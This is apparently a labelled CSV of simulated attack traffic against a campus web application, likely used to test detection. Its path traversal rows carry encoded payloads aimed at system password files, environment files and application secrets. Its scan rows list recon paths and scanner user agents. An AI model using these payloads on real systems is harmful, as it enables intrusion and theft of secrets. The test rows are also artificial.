scenario_id,category,intent_class,email,password,search_keyword,secondary_search_keyword,post_title,post_content,probe_path,ua
S023,path_traversal,attack,student3@campus.local,Password123!,..%2F..%2F..%2F..%2Fetc%2Fpasswd,..%255c..%255c..%255cboot.ini,Traversal probe alpha,Unix traversal payloads pushed through search and probe path,/download?file=../../../../etc/passwd,curl/8.6
S024,path_traversal,attack,student4@campus.local,Password123!,..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,%2e%2e%2f%2e%2e%2fsecret.txt,Traversal probe beta,Windows and dot encoded traversal variants inside public APIs,/api/public/announcements?file=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,python-requests/2.32
S025,path_traversal,attack,student5@campus.local,Password123!,..%2F..%2F..%2F..%2Fetc%2Fshadow,....//....//....//etc/passwd,Traversal probe gamma,Shadow file and overlong slash traversal attempts chained,/api/public/academic-events?q=..%2F..%2F..%2F..%2Fetc%2Fshadow,Mozilla/5.0
S026,path_traversal,attack,student1@campus.local,Password123!,..%2F..%2Fapp.properties,%252e%252e%252f%252e%252e%252fetc%252fpasswd,Traversal probe delta,Application config and double encoded traversal pair,/static/../../../../etc/passwd,Wget/1.21.4
S027,path_traversal,attack,student2@campus.local,Password123!,..%2F..%2F..%2FWEB-INF%2Fweb.xml,..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,Traversal probe epsilon,Java web XML and proc environ probes mixed into board flow,/api/board/posts?keyword=..%2F..%2F..%2FWEB-INF%2Fweb.xml,Go-http-client/1.1
S028,path_traversal,attack,student3@campus.local,Password123!,..%255c..%255c..%255cwindows%255csystem.ini,%2e%2e%5c%2e%2e%5cboot.ini,Traversal probe zeta,Backslash encoded Windows traversal strings for parser coverage,/api/public/announcements?keyword=..%255c..%255c..%255cwindows%255csystem.ini,libwww-perl/6.77
S029,path_traversal,attack,student4@campus.local,Password123!,..%2F..%2F..%2F..%2Fvar%2Flog%2Fmessages,..%2F..%2F..%2F..%2Fhome%2Fapp%2F.env,Traversal probe eta,Log and hidden env file traversal strings in one session,/assets/..%2F..%2F..%2F..%2Fetc%2Fpasswd,curl/8.6
S030,path_traversal,attack,student5@campus.local,Password123!,%2e%2e%2f%2e%2e%2f%2e%2e%2fsecret.txt,%252e%252e%252fconfig.yml,Traversal probe theta,Relative path escape attempts with encoded suffix variations,/api/public/academic-events?q=%2e%2e%2f%2e%2e%2f%2e%2e%2fsecret.txt,python-requests/2.32
S031,path_traversal,attack,student1@campus.local,Password123!,....//....//....//etc/passwd,..%2F..%2F..%2F..%2Fopt%2Fapp%2Fsecrets.yml,Traversal probe iota,Overlong traversal probe followed by YAML secret path lookup,/files?name=....//....//....//etc/passwd,Mozilla/5.0
S032,path_traversal,attack,student2@campus.local,Password123!,%252e%252e%252f%252e%252e%252fetc%252fpasswd,..%2F..%2F..%2F..%2Fnginx%2Fnginx.conf,Traversal probe kappa,Double encoded traversal combined with nginx config discovery,/api/board/posts?keyword=%252e%252e%252f%252e%252e%252fetc%252fpasswd,Wget/1.21.4
S033,scan,attack,student3@campus.local,Password123!,admin,administrator,Scan probe alpha,Recon session looking for classic admin endpoints,/admin,Nikto/2.5.0
S034,scan,attack,student4@campus.local,Password123!,wp-login.php,wp-admin,Scan probe beta,Recon session targeting WordPress login and admin paths,/wp-login.php,sqlmap/1.8
S035,scan,attack,student5@campus.local,Password123!,backup.zip,.env,Scan probe gamma,Recon session requesting backup archives and hidden env files,/backup.zip,python-requests/2.32
S036,scan,attack,student1@campus.local,Password123!,phpmyadmin,server-status,Scan probe delta,Recon session combining phpMyAdmin and status page discovery,/phpmyadmin/,curl/8.6
S037,scan,attack,student2@campus.local,Password123!,actuator,health,Scan probe epsilon,Recon session checking actuator and health exposure,/actuator/health,Mozilla/5.0
S038,scan,attack,student3@campus.local,Password123!,git,config,Scan probe zeta,Recon session checking exposed git metadata path,/.git/config,Wget/1.21.4
S039,scan,attack,student4@campus.local,Password123!,administrator,admin-console,Scan probe eta,Recon session probing alternate admin console names,/administrator,Go-http-client/1.1
S040,scan,attack,student5@campus.local,Password123!,wp-admin,index.php?author=1,Scan probe theta,Recon session with WordPress admin and author enumeration flavor,/wp-admin/,Nikto/2.5.0
S041,scan,attack,student1@campus.local,Password123!,config.yml,settings.php,Scan probe iota,Recon session hunting config files and CMS leftovers,/config.yml,curl/8.6
S042,scan,attack,student2@campus.local,Password123!,server-status,nginx_status,Scan probe kappa,Recon session validating exposed status endpoints,/server-status,kube-probe/1.30
